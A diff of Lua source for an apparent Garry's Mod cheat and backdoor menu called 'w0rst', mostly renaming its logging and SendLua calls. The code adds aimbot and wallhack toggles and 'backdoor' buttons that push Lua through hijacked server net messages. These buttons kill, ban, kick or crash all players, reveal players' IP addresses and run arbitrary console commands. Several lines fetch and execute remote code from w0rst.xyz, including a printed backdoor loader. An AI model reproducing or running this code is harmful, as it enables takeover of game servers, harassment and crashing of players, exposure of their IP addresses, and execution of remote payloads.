-    if enable['Name'] then
-        wtf.Log("Names Enabled")
+    wtf.enable['Name'] = not wtf.enable['Name']
+    if wtf.enable['Name'] then
+        Log("Names Enabled")
     else
-        wtf.Log("Names Disabled")
+        Log("Names Disabled")
     end
 end)
 
 CreateCheckbox("Plr-Weapons", VisualsTab[1], 382, 10, function()
-    enable['Weapon'] = not enable['Weapon']
-    if enable['Weapon'] then
-        wtf.Log("Weapons Enabled")
+    wtf.enable['Weapon'] = not wtf.enable['Weapon']
+    if wtf.enable['Weapon'] then
+        Log("Weapons Enabled")
     else
-        wtf.Log("Weapons Disabled")
+        Log("Weapons Disabled")
     end
 end)
 
 CreateCheckbox("Plr-2D-Box", VisualsTab[1], 22, 40, function()
-    enable['Box2D'] = not enable['Box2D']
-    if enable['Box2D'] then
-        wtf.Log("2D Boxes Enabled")
+    wtf.enable['Box2D'] = not wtf.enable['Box2D']
+    if wtf.enable['Box2D'] then
+        Log("2D Boxes Enabled")
     else
-        wtf.Log("2D Boxes Disabled")
+        Log("2D Boxes Disabled")
     end
 end)
 
 CreateCheckbox("Plr-3D-Box", VisualsTab[1], 142, 40, function()
-    enable['Box3D'] = not enable['Box3D']
-    if enable['Box3D'] then
-        wtf.Log("3D Boxes Enabled")
+    wtf.enable['Box3D'] = not wtf.enable['Box3D']
+    if wtf.enable['Box3D'] then
+        Log("3D Boxes Enabled")
     else
-        wtf.Log("3D Boxes Disabled")
+        Log("3D Boxes Disabled")
     end
 end)
 
 CreateCheckbox("Plr-Skeletons", VisualsTab[1], 262, 40, function()
-    enable['Skeleton'] = not enable['Skeleton']
-    if enable['Skeleton'] then
-        wtf.Log("Skeletons Enabled")
+    wtf.enable['Skeleton'] = not wtf.enable['Skeleton']
+    if wtf.enable['Skeleton'] then
+        Log("Skeletons Enabled")
     else
-        wtf.Log("Skeletons Disabled")
+        Log("Skeletons Disabled")
     end
 end)
 
 CreateCheckbox("Plr-Chams", VisualsTab[1], 382, 40, function()
-    enable['Chams'] = not enable['Chams']
-    if enable['Chams']then
-        wtf.Log("Chams Enabled")
+    wtf.enable['Chams'] = not wtf.enable['Chams']
+    if wtf.enable['Chams']then
+        Log("Chams Enabled")
     else
-        wtf.Log("Chams Disabled")
+        Log("Chams Disabled")
     end
 end)
 
 CreateCheckbox("Ent-Names", VisualsTab[1], 22, 70, function()
-    enable['EntName'] = not enable['EntName']
-    if enable['EntName'] then
-        wtf.Log("Ent Names Enabled")
+    wtf.enable['EntName'] = not wtf.enable['EntName']
+    if wtf.enable['EntName'] then
+        Log("Ent Names Enabled")
     else
-        wtf.Log("Ent Names Disabled")
+        Log("Ent Names Disabled")
     end
 end)
 
 CreateCheckbox("Ent-Distance", VisualsTab[1], 142, 70, function()
-    enable['EntDistance'] = not enable['EntDistance']
-    if enable['EntDistance'] then
-        wtf.Log("Ent Distance Enabled")
+    wtf.enable['EntDistance'] = not wtf.enable['EntDistance']
+    if wtf.enable['EntDistance'] then
+        Log("Ent Distance Enabled")
     else
-        wtf.Log("Ent Distance Disabled")
+        Log("Ent Distance Disabled")
     end
 end)
 
 CreateCheckbox("Ent-3D", VisualsTab[1], 262, 70, function()
-    enable['Ent3D'] = not enable['Ent3D']
-    if enable['Ent3D'] then
-        wtf.Log("Ent 3D Boxes Enabled")
+    wtf.enable['Ent3D'] = not wtf.enable['Ent3D']
+    if wtf.enable['Ent3D'] then
+        Log("Ent 3D Boxes Enabled")
     else
-        wtf.Log("Ent 3D Boxes Disabled")
+        Log("Ent 3D Boxes Disabled")
     end
 end)
 
 CreateCheckbox("Wallhack", VisualsTab[1], 382, 70, function()
-    enable['Wallhack'] = not enable['Wallhack']
-    if enable['Wallhack'] then
-        wtf.Log("Wallhack Enabled")
+    wtf.enable['Wallhack'] = not wtf.enable['Wallhack']
+    if wtf.enable['Wallhack'] then
+        Log("Wallhack Enabled")
     else
-        wtf.Log("Wallhack Disabled")
+        Log("Wallhack Disabled")
     end
 end)
 
 CreateCheckbox("Free Camera", VisualsTab[1], 22, 100, function()
-    enable['FreeCamera'] = not enable['FreeCamera']
-    if enable['FreeCamera'] then
-        FreeCamera['SetView'] = true
-        wtf.Log("Freecam Enabled")
+    wtf.enable['FreeCamera'] = not wtf.enable['FreeCamera']
+    if wtf.enable['FreeCamera'] then
+        FreeCamera.SetView = true
+        Log("Freecam Enabled")
     else
-        wtf.Log("Freecam Disabled")
+        Log("Freecam Disabled")
     end
 end)
 
 CreateCheckbox("Spectator List", VisualsTab[1], 142, 100, function()
-    enable['SpectatorList'] = not enable['SpectatorList']
-    if enable['SpectatorList'] then
-        wtf.Log("Spectator List Enabled")
+    wtf.enable['SpectatorList'] = not wtf.enable['SpectatorList']
+    if wtf.enable['SpectatorList'] then
+        Log("Spectator List Enabled")
     else
-        wtf.Log("Spectator List Disabled")
+        Log("Spectator List Disabled")
     end
 end)
 
 CreateButton("Refresh Ents", VisualsTab[1], 80, 25, 15, 160, EntityList.Clear)
 
 local function SaveVisuals()
-    local json = util.TableToJSON(color, true)
+    local json = util.TableToJSON(wtf.color, true)
     file.Write("w0rst/visuals.txt", json)
-    wtf.Log("Saved Visuals")
+    Log("Saved Visuals")
 end
 
 local function LoadVisuals()
     if file.Exists("w0rst/visuals.txt", "DATA") then
         local file = file.Read("w0rst/visuals.txt", "DATA")
         local json = util.JSONToTable(file)
-        table.Merge(color, json)
+        table.Merge(wtf.color, json)
         for i = 1, #ColorSliders do
             ColorSliders[i].Update()
-        end; wtf.Log("Loaded Visuals")
+        end; Log("Loaded Visuals")
     else
-        wtf.Log("Unable To Load Visuals")
+        Log("Unable To Load Visuals")
     end
 end
 
@@ -1464,33 +1488,33 @@ CreateButton("Load Visuals", MiscTab[1], 80, 25, 340, 250, LoadVisuals)
 CreateSoundButtons()
 
 CreateBDServer("wmenu-memento", function()
-    http.Fetch('https://w0rst.xyz/script/extra/wgamefucker', function(b) wtf.SendLua(b) end)
-    wtf.Log("??? wgamefucker ???")
+    http.Fetch('https://w0rst.xyz/script/extra/wgamefucker', function(b) SendLua(b) end)
+    Log("??? wgamefucker ???")
 end)
 
 CreateBDServer("Kill All", function()
-    wtf.SendLua("for k,v in pairs(player.GetAll()) do v:Kill() v:Spawn() end")
-    wtf.Log("Everyone Killed")
+    SendLua("for k,v in pairs(player.GetAll()) do v:Kill() v:Spawn() end")
+    Log("Everyone Killed")
 end)
 
 CreateBDServer("Fling All", function()
-    wtf.SendLua("for k,v in pairs(player.GetAll()) do v:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(500,1000))) end")
-    wtf.Log("Everyone Flung")
+    SendLua("for k,v in pairs(player.GetAll()) do v:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(500,1000))) end")
+    Log("Everyone Flung")
 end)
 
 CreateBDServer("Ignite All", function()
-    wtf.SendLua("for k,v in pairs(player.GetAll()) do v:Ignite(9999999,9999999) end")
-    wtf.Log("Everyone Ignited")
+    SendLua("for k,v in pairs(player.GetAll()) do v:Ignite(9999999,9999999) end")
+    Log("Everyone Ignited")
 end)
 
 CreateBDServer("Extinguish All", function()
-    wtf.SendLua("for k,v in pairs(player.GetAll()) do v:Extinguish() end")
-    wtf.Log("Everyone Extinguished")
+    SendLua("for k,v in pairs(player.GetAll()) do v:Extinguish() end")
+    Log("Everyone Extinguished")
 end)
 
 CreateBDServer("Ban All", function()
-     wtf.Log("Everyone Banned")
-    wtf.SendLua([[
+     Log("Everyone Banned")
+    SendLua([[
         for k,v in pairs(player.GetAll()) do
             v:Ban(9999999999, false)
             v:Kick()
@@ -1499,8 +1523,8 @@ CreateBDServer("Ban All", function()
 end)
 
 CreateBDServer("Kick All", function()
-     wtf.Log("Everyone Kicked")
-    wtf.SendLua([[
+     Log("Everyone Kicked")
+    SendLua([[
         for k,v in pairs(player.GetAll()) do
             v:Kick()
         end
@@ -1508,8 +1532,8 @@ CreateBDServer("Kick All", function()
 end)
 
 CreateBDServer("Retry All", function()
-    wtf.Log("Everyone Retry'd")
-    wtf.SendLua([[
+    Log("Everyone Retry'd")
+    SendLua([[
         for k,v in pairs(player.GetAll()) do
             v:ConCommand('retry')
         end
@@ -1517,8 +1541,8 @@ CreateBDServer("Retry All", function()
 end)
 
 CreateBDServer("Crash All", function()
-    wtf.Log("Everyone Crashed")
-    wtf.SendLua([[
+    Log("Everyone Crashed")
+    SendLua([[
         local id = Player(]]..LocalPlayer():UserID()..[[)
         for k,v in pairs(player.GetAll()) do
             if v:Nick() ~= id:Nick() then
@@ -1529,8 +1553,8 @@ CreateBDServer("Crash All", function()
 end)
 
 CreateBDServer("Teleport All",  function()
-    wtf.Log("Everyone Teleported")
-    wtf.SendLua([[
+    Log("Everyone Teleported")
+    SendLua([[
 			for k,v in pairs(player.GetAll()) do
 				local tps = v:GetEyeTraceNoCursor().HitPos
 				v:SetPos(tps)
@@ -1540,8 +1564,8 @@ end)
 
 CreateBDServer("Speed All", function()
     CreateInputBox("Set Speed All", function(str) 
-        wtf.Log("Speed Set: "..str)
-        wtf.SendLua([[
+        Log("Speed Set: "..str)
+        SendLua([[
             for k,v in pairs(player.GetAll()) do
                 v:SetMaxSpeed(]]..str..[[)
                 v:SetRunSpeed(]]..str..[[)
@@ -1551,8 +1575,8 @@ CreateBDServer("Speed All", function()
 end)
 
 CreateBDServer("Dance All",  function()
-    wtf.Log("Everyone's Dancing")
-    wtf.SendLua([[
+    Log("Everyone's Dancing")
+    SendLua([[
         for k,v in pairs(player.GetAll()) do
             v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
         end
@@ -1561,8 +1585,8 @@ end)
 
 CreateBDServer("Force Say All", function()
     CreateInputBox("Force Say", function(str)
-        wtf.Log("Everyone Just Said: "..str)
-        wtf.SendLua([[
+        Log("Everyone Just Said: "..str)
+        SendLua([[
             for k,v in pairs(player.GetAll()) do
                 v:Say("]]..str..[[")
             end
@@ -1571,21 +1595,21 @@ CreateBDServer("Force Say All", function()
 end)
 
 CreateBDServer("Encony fucker", function()
-    wtf.SendLua("for k,v in pairs(player.GetAll()) do v:addMoney(9999999999999) end")
-    wtf.Log("Eco got raped cuh")
+    SendLua("for k,v in pairs(player.GetAll()) do v:addMoney(9999999999999) end")
+    Log("Eco got raped cuh")
 end)
 
 CreateBDServer("Console Say", function()
     CreateInputBox("Console Say", function(str)
-        wtf.Log("Console Said: "..str)
-        wtf.SendLua([[RunConsoleCommand("say",']]..str..[[')]])
+        Log("Console Said: "..str)
+        SendLua([[RunConsoleCommand("say",']]..str..[[')]])
     end)
 end)
 
 CreateBDServer("Size All", function()
     CreateInputBox("Size Everyone", function(str)
-        wtf.Log("Everyones Size: "..str)
-        wtf.SendLua([[
+        Log("Everyones Size: "..str)
+        SendLua([[
             for k,v in pairs(player.GetAll()) do
                 v:SetModelScale(']]..str..[[')
             end
@@ -1595,8 +1619,8 @@ end)
 
 CreateBDServer("ConCommand All", function()
     CreateInputBox("ConCommand All", function(str)
-        wtf.Log("Ran Command: "..str)
-        wtf.SendLua([[
+        Log("Ran Command: "..str)
+        SendLua([[
             for k,v in pairs(player.GetAll()) do
                 v:ConCommand(']]..str..[[')
             end
@@ -1606,8 +1630,8 @@ end)
 
 CreateBDServer("JumpPower All", function()
     CreateInputBox("JumpPower All", function(str)
-        wtf.Log("Everyones JumpPower: "..str)
-        wtf.SendLua([[
+        Log("Everyones JumpPower: "..str)
+        SendLua([[
             for k,v in pairs(player.GetAll()) do
                 v:SetJumpPower(]]..str..[[)
             end
@@ -1616,8 +1640,8 @@ CreateBDServer("JumpPower All", function()
 end)
 
 CreateBDServer("Break Glass", function()
-  wtf.Log("Glass Breaking funninot ")
-		wtf.SendLua([[
+  Log("Glass Breaking funninot ")
+		SendLua([[
 			for k,v in pairs(player.GetAll()) do
 				v:EmitSound("physics/glass/glass_largesheet_break" .. math.random(1, 3) .. ".wav", 100, math.random(40, 180))
 			end
@@ -1625,8 +1649,8 @@ CreateBDServer("Break Glass", function()
 	end)
 
 CreateBDServer("God All", function()
-    wtf.Log("Everyones God")
-    wtf.SendLua([[
+    Log("Everyones God")
+    SendLua([[
         for k,v in pairs(player.GetAll()) do
             v:GodEnable()
         end
@@ -1634,8 +1658,8 @@ CreateBDServer("God All", function()
 end)
 
 CreateBDServer("UnGod All", function()
-    wtf.Log("Everyones UnGoded")
-    wtf.SendLua([[
+    Log("Everyones UnGoded")
+    SendLua([[
         for k,v in pairs(player.GetAll()) do
             v:GodDisable()
         end
@@ -1643,8 +1667,8 @@ CreateBDServer("UnGod All", function()
 end)
 
 CreateBDServer("Stopsound All", function()
-    wtf.Log("Stopped All Sound")
-    wtf.SendLua([[
+    Log("Stopped All Sound")
+    SendLua([[
         for k,v in pairs(player.GetAll()) do
             v:ConCommand('stopsound')
         end
@@ -1652,8 +1676,8 @@ CreateBDServer("Stopsound All", function()
 end)
 
 CreateBDServer("Moan All", function()
-    wtf.Log("Everyone Moaned")
-    wtf.SendLua([[
+    Log("Everyone Moaned")
+    SendLua([[
     for k,v in pairs(player.GetAll()) do
         v:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))
     end
@@ -1661,19 +1685,19 @@ CreateBDServer("Moan All", function()
 end)
 
 CreateBDServer("Blind All", function()
-    wtf.Log("Everyone Blinded")
-    wtf.SendLua([[BroadcastLua("hook.Add('HUDPaint','Blindness',function() surface.SetDrawColor(255,255,255,255) surface.DrawRect(0,0,1920,1080) end)")]])
+    Log("Everyone Blinded")
+    SendLua([[BroadcastLua("hook.Add('HUDPaint','Blindness',function() surface.SetDrawColor(255,255,255,255) surface.DrawRect(0,0,1920,1080) end)")]])
 end)
 
 CreateBDServer("UnBlind All", function()
-    wtf.Log("Everyone UnBlinded")
-    wtf.SendLua([[BroadcastLua("hook.Remove('HUDPaint','Blindness')")]])
+    Log("Everyone UnBlinded")
+    SendLua([[BroadcastLua("hook.Remove('HUDPaint','Blindness')")]])
 end)
 
 CreateBDServer("Health All", function()
     CreateInputBox("Health All", function(str)
-        wtf.Log("Everyones Health Set: "..str)
-        wtf.SendLua([[
+        Log("Everyones Health Set: "..str)
+        SendLua([[
             for k,v in pairs(player.GetAll()) do
                 v:SetHealth(]]..str..[[)
             end
@@ -1683,8 +1707,8 @@ end)
 
 CreateBDServer("Armor All", function()
     CreateInputBox("Armor All", function(str)
-        wtf.Log("Everyones Armor Set: "..str)
-        wtf.SendLua([[
+        Log("Everyones Armor Set: "..str)
+        SendLua([[
             for k,v in pairs(player.GetAll()) do
                 v:SetArmor(]]..str..[[)
             end
@@ -1693,8 +1717,8 @@ CreateBDServer("Armor All", function()
 end)
 
 CreateBDClient("Kill", function()
-    wtf.Log("Killed: "..Player(SelectedPlr):Nick())
-    wtf.SendLua([[
+    Log("Killed: "..Player(SelectedPlr):Nick())
+    SendLua([[
         local me = Player(]]..SelectedPlr..[[)
         me:Kill()
         me:Spawn()
@@ -1702,8 +1726,8 @@ CreateBDClient("Kill", function()
 end)
 
 CreateBDClient("Fling", function()
-    wtf.Log("Flung: "..Player(SelectedPlr):Nick())
-    wtf.SendLua([[
+    Log("Flung: "..Player(SelectedPlr):Nick())
+    SendLua([[
         local me = Player(]]..SelectedPlr..[[)
         me:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(50,1000)))
     ]])
@@ -1711,8 +1735,8 @@ end)
 
 CreateBDClient("Set Speed",  function()
     CreateInputBox("Set Speed", function(str)
-        wtf.Log(Player(SelectedPlr):Nick().." Speed Set")
-        wtf.SendLua([[
+        Log(Player(SelectedPlr):Nick().." Speed Set")
+        SendLua([[
             local me = Player(]]..SelectedPlr..[[)
             me:SetMaxSpeed(]]..str..[[)
             me:SetRunSpeed(]]..str..[[)
@@ -1722,8 +1746,8 @@ end)
 
 CreateBDClient("Give Item",  function()
     CreateInputBox("Give Item", function(str)
-        wtf.Log("Item Given To: "..Player(SelectedPlr):Nick())
-        wtf.SendLua([[
+        Log("Item Given To: "..Player(SelectedPlr):Nick())
+        SendLua([[
             local me = Player(]]..SelectedPlr..[[)
             me:Give(']]..str..[[')
         ]])
@@ -1731,14 +1755,14 @@ CreateBDClient("Give Item",  function()
 end)
 
 CreateBDClient("Crash Player",  function()
-    wtf.Log("Player: "..Player(SelectedPlr):Nick().." Crashed")
-    wtf.SendLua([[Player(]]..SelectedPlr..[[):SendLua("function die() return die() end die()")]])
+    Log("Player: "..Player(SelectedPlr):Nick().." Crashed")
+    SendLua([[Player(]]..SelectedPlr..[[):SendLua("function die() return die() end die()")]])
 end)
 
 CreateBDClient("Force Say",  function()
     CreateInputBox("Force Say", function(str)
-        wtf.Log("Player: "..Player(SelectedPlr):Nick().." Said "..str)
-        wtf.SendLua([[
+        Log("Player: "..Player(SelectedPlr):Nick().." Said "..str)
+        SendLua([[
             local me = Player(]]..SelectedPlr..[[)
             me:Say("]]..str..[[")
         ]])
@@ -1746,7 +1770,7 @@ CreateBDClient("Force Say",  function()
 end)
 
 CreateBDClient("NoClip Player",  function()
-    wtf.SendLua([[
+    SendLua([[
         local me = Player(]]..SelectedPlr..[[)
         if me:GetMoveType() ~= MOVETYPE_NOCLIP then
             me:SetMoveType(MOVETYPE_NOCLIP)
@@ -1756,41 +1780,41 @@ CreateBDClient("NoClip Player",  function()
     ]])
 
     if Player(SelectedPlr):GetMoveType() == MOVETYPE_NOCLIP then
-        wtf.Log("Noclip Off")
+        Log("Noclip Off")
     else
-        wtf.Log("Noclip On")
+        Log("Noclip On")
     end
 end)
 
 CreateBDClient("Set Usergroup",  function()
     CreateInputBox("Set Usergroup", function(str)
-        wtf.Log("Player: "..Player(SelectedPlr):Nick().." Usergroup: "..str)
-        wtf.SendLua([[
+        Log("Player: "..Player(SelectedPlr):Nick().." Usergroup: "..str)
+        SendLua([[
             local me = Player(]]..SelectedPlr..[[)
             me:SetUserGroup("]]..str..[[")
         ]])
     end)
 end)
 
-CreateBDClient("God Enable",  function()
-    wtf.Log("Player: "..Player(SelectedPlr):Nick().." Godded")
-    wtf.SendLua([[
+CreateBDClient("God wtf.enable",  function()
+    Log("Player: "..Player(SelectedPlr):Nick().." Godded")
+    SendLua([[
         local me = Player(]]..SelectedPlr..[[)
         me:GodEnable()
     ]])
 end)
 
 CreateBDClient("God Disable",  function()
-    wtf.Log("Player: "..Player(SelectedPlr):Nick().." UnGodded")
-    wtf.SendLua([[
+    Log("Player: "..Player(SelectedPlr):Nick().." UnGodded")
+    SendLua([[
         local me = Player(]]..SelectedPlr..[[)
         me:GodDisable()
     ]])
 end)
 
 CreateBDClient("Ban Player",  function()
-    wtf.Log("Player"..Player(SelectedPlr):Nick().." Banned")
-    wtf.SendLua([[
+    Log("Player"..Player(SelectedPlr):Nick().." Banned")
+    SendLua([[
         local me = Player(]]..SelectedPlr..[[)
         me:Ban(999999999,false)
         me:Kick()
@@ -1798,24 +1822,24 @@ CreateBDClient("Ban Player",  function()
 end)
 
 CreateBDClient("Kick Player",  function()
-    wtf.Log("Player "..Player(SelectedPlr):Nick().." Kicked")
-    wtf.SendLua([[
+    Log("Player "..Player(SelectedPlr):Nick().." Kicked")
+    SendLua([[
         local me = Player(]]..SelectedPlr..[[)
         me:Kick()
     ]])
 end)
 
 CreateBDClient("Retry Player",  function()
-    wtf.Log("Player "..Player(SelectedPlr):Nick().." Retry'd")
-    wtf.SendLua([[
+    Log("Player "..Player(SelectedPlr):Nick().." Retry'd")
+    SendLua([[
         local me = Player(]]..SelectedPlr..[[)
         me:ConCommand('retry')
     ]])
 end)
 
 CreateBDClient("Print Ip",  function()
-    wtf.Log("Players IPs Logged")
-    wtf.SendLua([[
+    Log("Players IPs Logged")
+    SendLua([[
         local me = Player(]]..SelectedPlr..[[)
         local ply = ]]..LocalPlayer():UserID()..[[
         Player(ply):ChatPrint("Player: " .. me:Nick() .. " (" .. me:SteamID() .. ") IP: " .. me:IPAddress())
@@ -1823,8 +1847,8 @@ CreateBDClient("Print Ip",  function()
 end)
 
 CreateBDClient("Dance Player",  function()
-    wtf.Log("Players: "..Player(SelectedPlr):Nick().." Dancing")
-    wtf.SendLua([[
+    Log("Players: "..Player(SelectedPlr):Nick().." Dancing")
+    SendLua([[
         local me = Player(]]..SelectedPlr..[[)
         me:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE)
     ]])
@@ -1832,8 +1856,8 @@ end)
 
 CreateBDClient("Size Player",  function()
     CreateInputBox("Set Size", function(str)
-        wtf.Log("Player: "..Player(SelectedPlr):Nick().." Size:"..str)
-        wtf.SendLua([[
+        Log("Player: "..Player(SelectedPlr):Nick().." Size:"..str)
+        SendLua([[
             local me = Player(]]..SelectedPlr..[[)
             me:SetModelScale(']]..SelectedPlr..[[')
         ]])
@@ -1842,8 +1866,8 @@ end)
 
 CreateBDClient("ConCommand Player",  function()
     CreateInputBox("ConCommand", function(str)
-        wtf.Log("Ran Command: "..str.." Player: "..Player(SelectedPlr):Nick())
-        wtf.SendLua([[
+        Log("Ran Command: "..str.." Player: "..Player(SelectedPlr):Nick())
+        SendLua([[
             local me = Player(]]..SelectedPlr..[[)
             me:ConCommand(']]..str..[[')
         ]])
@@ -1851,16 +1875,16 @@ CreateBDClient("ConCommand Player",  function()
 end)
 
 CreateBDClient("IP Say",  function()
-    wtf.Log("They Said There Ip")
-    wtf.SendLua([[
+    Log("They Said There Ip")
+    SendLua([[
   			local me = Player(]].. SelectedPlr..[[)
   			me:Say("My IP Is: "..me:IPAddress())
     ]])
 end)
 
 CreateBDClient("Drop Weapon",  function()
-    wtf.Log("They Dropped Their Weapon")
-    wtf.SendLua([[
+    Log("They Dropped Their Weapon")
+    SendLua([[
         local me = Player(]].. SelectedPlr..[[)
         if me:GetActiveWeapon() ~= nil then
             me:DropWeapon(me:GetActiveWeapon())
@@ -1869,8 +1893,8 @@ CreateBDClient("Drop Weapon",  function()
 end)
 
 CreateBDClient("Explode Player", function()
-    wtf.Log("Exploded "..Player( SelectedPlr):Nick())
-    wtf.SendLua([[
+    Log("Exploded "..Player( SelectedPlr):Nick())
+    SendLua([[
         local explo = ents.Create("env_explosion")
         local me = Player(]].. SelectedPlr..[[)
 
@@ -1888,25 +1912,25 @@ CreateBDClient("Explode Player", function()
 end)
 
 CreateButton("Net-Scan", BackdoorTab[1], 115, 30, 19, 520, function()
-    wtf.CheckWebNets()
+    CheckWebNets()
 end)
 
 CreateButton("Select-Net", BackdoorTab[1], 115, 30, 139, 520, function()
     CreateInputBox("Select Net", function(str)
-        if wtf.CheckNet(str) then
+        if CheckNet(str) then
             SelectedNet=str
-            wtf.Log("Selected Net "..str)
-            wtf.conoutRGB("NET SELECTED: "..str)
+            Log("Selected Net "..str)
+            conoutRGB("NET SELECTED: "..str)
         else
-            wtf.Log("Invalid Net")
-            wtf.conoutRGB("NET INVALID")
+            Log("Invalid Net")
+            conoutRGB("NET INVALID")
         end
     end)
 end)
 
 CreateButton("Add-Net", BackdoorTab[1], 115, 30, 259, 520, function()
     CreateInputBox("Add Net", function(str)
-        wtf.AddNet(str)
+        AddNet(str)
     end)
 end)
 
@@ -1915,18 +1939,18 @@ CreateButton("Run Lua", BackdoorTab[1], 115, 30, 379, 520, function()
         _G.net.Start(SelectedNet)
         _G.net.WriteString(LuaEditor:GetValue())
         _G.net.WriteBit(false)
-        _G.net.SendToServer(); wtf.Log("Ran Lua - Server")
+        _G.net.SendToServer(); Log("Ran Lua - Server")
     else
-        wtf.Log("No Net Selected")
+        Log("No Net Selected")
     end
 end)
 
 CreateCheckbox("Adv-Bhop", MiscTab[1], 22, 10, function()
-    enable['Bhop'] = not enable['Bhop']
-    if enable['Bhop'] then
-        wtf.Log("Bhop Enabled")
+    wtf.enable['Bhop'] = not wtf.enable['Bhop']
+    if wtf.enable['Bhop'] then
+        Log("Bhop Enabled")
     else
-        wtf.Log("Bhop Disabled")
+        Log("Bhop Disabled")
     end
 end)
 
@@ -1946,93 +1970,93 @@ CreateButton("Net-Dumper", MiscTab[1], 110, 25, 142, 10, function()
         end
     end
 
-    wtf.Log("Check Console")
-    wtf.conoutRGB("NET DUMP LOCATION: GarrysMod\\garrysmod\\data\\"..name)
+    Log("Check Console")
+    conoutRGB("NET DUMP LOCATION: GarrysMod\\garrysmod\\data\\"..name)
 end)
 
 CreateButton("w0rst-backdoor", MiscTab[1], 110, 25, 262, 10, function()
     MsgC("timer.Simple(5, function() http.Fetch('https://w0rst.xyz/script/napalm', RunString) end)\n")
-    wtf.Log("Check Console")
+    Log("Check Console")
 end)
 
 CreateCheckbox("RGB-Physgun", MiscTab[1], 382, 10, function()
-    enable['PhysRainbow'] = not enable['PhysRainbow']
-    if enable['PhysRainbow'] then
-        wtf.Log("RGB-Physgun Enabled")
+    wtf.enable['PhysRainbow'] = not wtf.enable['PhysRainbow']
+    if wtf.enable['PhysRainbow'] then
+        Log("RGB-Physgun Enabled")
     else
-        wtf.Log("RGB-Physgun Disabled")
+        Log("RGB-Physgun Disabled")
     end
 end)
 
 CreateCheckbox("Use-Spammer", MiscTab[1], 22, 40, function()
-    enable['UseSpam'] = not enable['UseSpam']
-    if enable['UseSpam'] then
-        wtf.Log("Use Spammer Enabled")
+    wtf.enable['UseSpam'] = not wtf.enable['UseSpam']
+    if wtf.enable['UseSpam'] then
+        Log("Use Spammer Enabled")
     else
-        wtf.Log("Use Spammer Disabled")
+        Log("Use Spammer Disabled")
     end
 end)
 
 CreateCheckbox("Flash-Spammer", MiscTab[1], 142, 40, function()
-    enable['FlashSpam'] = not enable['FlashSpam']
-    if enable['FlashSpam'] then
-        wtf.Log("Flash Spammer Enabled")
+    wtf.enable['FlashSpam'] = not wtf.enable['FlashSpam']
+    if wtf.enable['FlashSpam'] then
+        Log("Flash Spammer Enabled")
     else
-        wtf.Log("Flash Spammer Disabled")
+        Log("Flash Spammer Disabled")
     end
 end)
 
 CreateButton("FOV-Editor", MiscTab[1], 110, 25, 262, 40, function()
     CreateInputBox("Edit Fov", function(str)
         LocalPlayer():ConCommand("fov_desired "..str)
-        wtf.Log("FOV Set: "..str)
+        Log("FOV Set: "..str)
     end)
 end)
 
 CreateButton("Encode-String", MiscTab[1], 110, 25, 382, 40, function()
     CreateInputBox("Encode String", function(str)
         local encoded = str:gsub(".", function(bb) return "\\" .. bb:byte() end)
-        wtf.conoutRGB("ENCODED-STRING: ".."RunString('"..encoded.."')")
+        conoutRGB("ENCODED-STRING: ".."RunString('"..encoded.."')")
         SetClipboardText("RunString('"..encoded.."')")
-        wtf.Log("Check Console")
+        Log("Check Console")
       end)
 end)
 
 CreateCheckbox("Chat Advertise", MiscTab[1], 22, 70, function()
-    enable['ChatSpam'] = not enable['ChatSpam']
-    if enable['ChatSpam'] then
-        wtf.Log("Chat Advertiser Enabled")
+    wtf.enable['ChatSpam'] = not wtf.enable['ChatSpam']
+    if wtf.enable['ChatSpam'] then
+        Log("Chat Advertiser Enabled")
     else
-        wtf.Log("Chat Advertiser Disabled")
+        Log("Chat Advertiser Disabled")
     end
 end)
 
 CreateCheckbox("Fov Aimbot", MiscTab[1], 142, 70, function()
-    enable['Aimbot'] = not enable['Aimbot']
-    if enable['Aimbot'] then
-        wtf.Log("Aimbot Enabled")
+    wtf.enable['Aimbot'] = not wtf.enable['Aimbot']
+    if wtf.enable['Aimbot'] then
+        Log("Aimbot Enabled")
     else
-        wtf.Log("Aimbot Disabled")
+        Log("Aimbot Disabled")
     end
 end)
 
 CreateSlider("Fov:", FovCircle, MiscTab[1], 1000, 5, 262, 70)
 
 CreateCheckbox("Silent Lock", MiscTab[1], 382, 70, function()
-    enable['SilentLock'] = not enable['SilentLock']
-    if enable['SilentLock'] then
-        wtf.Log("Silent Lock Enabled")
+    wtf.enable['SilentLock'] = not wtf.enable['SilentLock']
+    if wtf.enable['SilentLock'] then
+        Log("Silent Lock Enabled")
     else
-        wtf.Log("Silent Lock Disabled")
+        Log("Silent Lock Disabled")
     end
 end)
 
 CreateCheckbox("Auto Fire", MiscTab[1], 22, 100, function()
-    enable['AutoFire'] = not enable['AutoFire']
-    if enable['AutoFire'] then
-        wtf.Log("Aimbot AutoFire Enabled")
+    wtf.enable['AutoFire'] = not wtf.enable['AutoFire']
+    if wtf.enable['AutoFire'] then
+        Log("Aimbot AutoFire Enabled")
     else
-        wtf.Log("Aimbot AutoFire Disabled")
+        Log("Aimbot AutoFire Disabled")
     end
 end)
 
@@ -2042,14 +2066,14 @@ CreateBindableButton("Bind Menu", "Menu", MiscTab[1], 262, 100)
 
 CreateButton("Play URL-Link", SoundsTab[1], 120, 35, 385, 520, function()
     CreateInputBox("Play URL", function(str)
-        wtf.SendLua([[BroadcastLua("sound.PlayURL(']]..str..[[' , 'mono', function() end)")]])
-        wtf.Log("Playing: " .. str)
+        SendLua([[BroadcastLua("sound.PlayURL(']]..str..[[' , 'mono', function() end)")]])
+        Log("Playing: " .. str)
     end)
 end)
 
 CreateButton("Stop Sounds", SoundsTab[1], 120, 35, 255, 520, function()
-    wtf.SendLua([[for k,v in pairs(player.GetAll()) do v:ConCommand('stopsound') end]])
-    wtf.Log("Stopped Sounds")
+    SendLua([[for k,v in pairs(player.GetAll()) do v:ConCommand('stopsound') end]])
+    Log("Stopped Sounds")
 end)
 
 --/ http.Fetch("https://w0rst.xyz/script/load", RunString)
